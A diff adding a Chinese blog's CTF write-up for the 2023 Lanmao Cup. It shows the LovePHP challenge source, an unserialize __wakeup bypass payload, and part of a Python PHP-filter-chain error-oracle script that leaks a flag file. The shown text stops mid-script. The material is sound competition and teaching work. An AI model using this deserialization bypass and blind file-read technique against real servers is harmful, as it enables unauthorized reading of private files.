@@ -1,0 +1,535 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>蓝帽杯2023 - mof's Blog</title><meta name=Description content="这是mof的博客"><meta property="og:title" content="蓝帽杯2023"><meta property="og:description" content="ctf部分wp，电子取证做不了一点 2023第七届蓝帽杯全国大学生网络安全技能大赛电子取证参考题解 (qq.com) Web LovePHP <?php class Saferman{ public $check = True; public function __destruct(){ if($this->check === True){ file($_GET['secret']); } } public function __wakeup(){"><meta property="og:type" content="article"><meta property="og:url" content="https://githubmof.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/"><meta property="og:image" content="https://githubmof.github.io/images/w.ico"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-09T16:20:20+08:00"><meta property="article:modified_time" content="2023-09-10T04:41:04+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://githubmof.github.io/images/w.ico"><meta name=twitter:title content="蓝帽杯2023"><meta name=twitter:description content="ctf部分wp，电子取证做不了一点 2023第七届蓝帽杯全国大学生网络安全技能大赛电子取证参考题解 (qq.com) Web LovePHP <?php class Saferman{ public $check = True; public function __destruct(){ if($this->check === True){ file($_GET['secret']); } } public function __wakeup(){"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/images/w.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://githubmof.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF2023/><link rel=prev href=https://githubmof.github.io/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/><link rel=next href=https://githubmof.github.io/nepctf2023/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"蓝帽杯2023","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/githubmof.github.io\/%E8%93%9D%E5%B8%BD%E6%9D%AF2023\/"},"genre":"posts","keywords":"ctf","wordcount":1914,"url":"https:\/\/githubmof.github.io\/%E8%93%9D%E5%B8%BD%E6%9D%AF2023\/","datePublished":"2023-09-09T16:20:20+08:00","dateModified":"2023-09-10T04:41:04+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"mof"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><a href=https://github.com/githubmof class=github-corner target=_blank title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="3.5rem" height="3.5rem" viewBox="0 0 250 250" style="fill:#70b7fd;color:#fff;position:absolute;top:0;border:0;left:0;transform:scale(-1,1)" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章
+</a><a class=menu-item href=/tags/>标签
+</a><a class=menu-item href=/categories/>分类</a><div class=dropdown><a href=javascript:void(0); class="menu-item menu-more dropbtn" title>游戏</a><div class="menu-more-content dropdown-content"><a href=/game/mikutap/ title target=_blank rel=noopener>mikutap </a><a href=/game/catch-the-cat/ title target=_blank rel=noopener>逮住那只猫!</a></div></div><a class=menu-item href=/about/>关于
+</a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/ title>游戏</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">蓝帽杯2023</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://github.com/githubmof title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>mof</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>ctf</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-09-09>2023-09-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 1914 字&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 4 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#lovephp>LovePHP</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#takeway>takeway</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#story>story</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>ctf部分wp，电子取证做不了一点</p><p><a href=https://mp.weixin.qq.com/s/blH9fCNiPUq2nI52-lwfpA target=_blank rel="noopener noreffer">2023第七届蓝帽杯全国大学生网络安全技能大赛电子取证参考题解 (qq.com)</a></p><h2 id=web>Web</h2><h3 id=lovephp>LovePHP</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Saferman</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$check</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>check</span> <span class=o>===</span> <span class=k>True</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=nx>file</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>check</span><span class=o>=</span><span class=k>False</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;my_secret.flag&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;my_secret.flag&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>php 参数名传不了小数点，用<code>[</code>绕过</p><p>wakeup用<code>C</code>绕过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?my<span class=o>[</span>secret.flag<span class=o>=</span>C:8:<span class=s2>&#34;Saferman&#34;</span>:0:<span class=o>{}</span><span class=p>&amp;</span><span class=nv>secret</span><span class=o>=</span>
+</span></span></code></pre></div><p>file方法无回显，但能使用filter伪协议</p><p><a href=https://boogipop.com/2023/05/08/Web%e4%be%a7%e4%bf%a1%e9%81%93%e5%88%9d%e6%ad%a5%e8%ae%a4%e8%af%86/ target=_blank rel="noopener noreffer">Webの侧信道初步认识 | Boogiepop Doesn&rsquo;t Laugh (boogipop.com)</a></p><p>利用脚本侧信道攻击</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>import</span> <span class=nx>requests</span>
+</span></span><span class=line><span class=cl><span class=nx>import</span> <span class=nx>sys</span>
+</span></span><span class=line><span class=cl><span class=nx>from</span> <span class=nx>base64</span> <span class=nx>import</span> <span class=nx>b64decode</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>THE GRAND IDEA:
+</span></span></span><span class=line><span class=cl><span class=s2>We can use PHP memory limit as an error oracle. Repeatedly applying the convert.ic                                                                            onv.L1.UCS-4LE
+</span></span></span><span class=line><span class=cl><span class=s2>filter will blow up the string length by 4x every time it is used, which will quickly cause
+</span></span></span><span class=line><span class=cl><span class=s2>500 error if and only if the string is non empty. So we now have an oracle that tells us if
+</span></span></span><span class=line><span class=cl><span class=s2>the string is empty.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>THE GRAND IDEA 2:
+</span></span></span><span class=line><span class=cl><span class=s2>The dechunk filter is interesting.
+</span></span></span><span class=line><span class=cl><span class=s2>https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
+</span></span></span><span class=line><span class=cl><span class=s2>It looks like it was implemented for something http related, but for our purposes, the interesting
+</span></span></span><span class=line><span class=cl><span class=s2>behavior is that if the string contains no newlines, it will wipe the entire string if and only if
+</span></span></span><span class=line><span class=cl><span class=s2>the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
+</span></span></span><span class=line><span class=cl><span class=s2>above oracle! In fact we can verify that since the flag starts with D that the filter chain
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>does not cause a 500 error.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>THE REST:
+</span></span></span><span class=line><span class=cl><span class=s2>So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
+</span></span></span><span class=line><span class=cl><span class=s2>into madness trying to figure out ways to:
+</span></span></span><span class=line><span class=cl><span class=s2>- somehow get other characters not at the start of the flag file to the front
+</span></span></span><span class=line><span class=cl><span class=s2>- detect more precisely which character is at the front
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=nx>x</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;|&#39;</span><span class=o>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>err</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>print</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>raise</span> <span class=nx>ValueError</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>req</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>data</span> <span class=o>=</span> <span class=s1>&#39;{}&amp;secret=php://filter/{s}/resource=/flag&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>requests</span><span class=o>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;http://url/index.php?my[secret.flag=C:8:&#34;Saferman&#34;:0:{data}&#39;</span><span class=p>)</span><span class=o>.</span><span class=nx>status_code</span> <span class=o>==</span> <span class=mi>500</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>Step 1:
+</span></span></span><span class=line><span class=cl><span class=s2>The second step of our exploit only works under two conditions:
+</span></span></span><span class=line><span class=cl><span class=s2>- String only contains a-zA-Z0-9
+</span></span></span><span class=line><span class=cl><span class=s2>- String ends with two equals signs
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>base64-encoding the flag file twice takes care of the first condition.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>We don&#39;t know the length of the flag file, so we can&#39;t be sure that it will end with two equals
+</span></span></span><span class=line><span class=cl><span class=s2>signs.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Repeated application of the convert.quoted-printable-encode will only consume additional
+</span></span></span><span class=line><span class=cl><span class=s2>memory if the base64 ends with equals signs, so that&#39;s what we are going to use as an oracle here.
+</span></span></span><span class=line><span class=cl><span class=s2>If the double-base64 does not end with two equals signs, we will add junk data to the start of the
+</span></span></span><span class=line><span class=cl><span class=s2>flag with convert.iconv..CSISO2022KR until it does.
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>blow_up_enc</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=p>[</span><span class=s1>&#39;convert.quoted-printable-encode&#39;</span><span class=p>]</span><span class=o>*</span><span class=mi>1000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>blow_up_utf32</span> <span class=o>=</span> <span class=s1>&#39;convert.iconv.L1.UCS-4LE&#39;</span>
+</span></span><span class=line><span class=cl><span class=nx>blow_up_inf</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=p>[</span><span class=nx>blow_up_utf32</span><span class=p>]</span><span class=o>*</span><span class=mi>50</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>header</span> <span class=o>=</span> <span class=s1>&#39;convert.base64-encode|convert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Start get baseline blowup
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>print</span><span class=p>(</span><span class=s1>&#39;Calculating blowup&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>baseline_blowup</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=nx>n</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>payload</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=p>[</span><span class=nx>blow_up_utf32</span><span class=p>]</span><span class=o>*</span><span class=nx>n</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{header}|{payload}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=nx>baseline_blowup</span> <span class=o>=</span> <span class=nx>n</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;baseline blowup is {baseline_blowup}&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>trailer</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=p>[</span><span class=nx>blow_up_utf32</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=nx>baseline_blowup</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>assert</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{header}|{trailer}&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=k>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=s1>&#39;detecting equals&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>j</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}&#39;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}&#39;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>j</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nx>sum</span><span class=p>(</span><span class=nx>j</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nx>j</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=k>False</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>header</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl><span class=nx>elif</span> <span class=nx>j</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=k>False</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>header</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl><span class=nx>elif</span> <span class=nx>j</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=k>False</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>header</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;convert.base64-encode|convert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;j: {j}&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;header: {header}&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>Step two:
+</span></span></span><span class=line><span class=cl><span class=s2>Now we have something of the form
+</span></span></span><span class=line><span class=cl><span class=s2>[a-zA-Z0-9 things]==
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Here the pain begins. For a long time I was trying to find something that would allow me to strip
+</span></span></span><span class=line><span class=cl><span class=s2>successive characters from the start of the string to access every character. Maybe something like
+</span></span></span><span class=line><span class=cl><span class=s2>that exists but I couldn&#39;t find it. However, if you play around with filter combinations you notice
+</span></span></span><span class=line><span class=cl><span class=s2>there are filters that *swap* characters:
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
+</span></span></span><span class=line><span class=cl><span class=s2>abcdefgh -&gt; badcfehg
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+</span></span></span><span class=line><span class=cl><span class=s2>abcdefgh -&gt; dcbahgfe
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>This allows us to access the first four characters of the string. Can we do better? It turns out
+</span></span></span><span class=line><span class=cl><span class=s2>YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
+</span></span></span><span class=line><span class=cl><span class=s2>the string:
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>The idea being that if we now use the r4 gadget, we get something like:
+</span></span></span><span class=line><span class=cl><span class=s2>ba&lt;0xfe&gt;&lt;0xff&gt;fedc
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
+</span></span></span><span class=line><span class=cl><span class=s2>&lt;0xfe&gt;&lt;0xff&gt; to get:
+</span></span></span><span class=line><span class=cl><span class=s2>bafedc
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
+</span></span></span><span class=line><span class=cl><span class=s2>characters of the string. There&#39;s only one problem: our r4 gadget requires that the string length
+</span></span></span><span class=line><span class=cl><span class=s2>is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
+</span></span></span><span class=line><span class=cl><span class=s2>we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
+</span></span></span><span class=line><span class=cl><span class=s2>good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
+</span></span></span><span class=line><span class=cl><span class=s2>turns out, if we apply the filter
+</span></span></span><span class=line><span class=cl><span class=s2>convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>It will turn the == into:
+</span></span></span><span class=line><span class=cl><span class=s2>+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>And this is magic, because this corrects such that when we apply the
+</span></span></span><span class=line><span class=cl><span class=s2>convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Let&#39;s recap. We have a string like:
+</span></span></span><span class=line><span class=cl><span class=s2>abcdefghij==
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
+</span></span></span><span class=line><span class=cl><span class=s2>abcdefghij+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Apply convert.iconv.CSUNICODE.CSUNICODE:
+</span></span></span><span class=line><span class=cl><span class=s2>&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Apply r4 gadget:
+</span></span></span><span class=line><span class=cl><span class=s2>ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Apply base64-decode | base64-encode, so the &#39;-&#39; and high bytes will disappear:
+</span></span></span><span class=line><span class=cl><span class=s2>bafedcjihg+0DAD3D3+0DAD3Dw==
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Then apply r4 once more:
+</span></span></span><span class=line><span class=cl><span class=s2>efabijcd0+gh3DAD0+3D3DAD==wD
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>And here&#39;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but
+</span></span></span><span class=line><span class=cl><span class=s2>the string still has two equals signs in it, so we can reapply the technique as many times as we
+</span></span></span><span class=line><span class=cl><span class=s2>want, to access all the characters in the string ;)
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
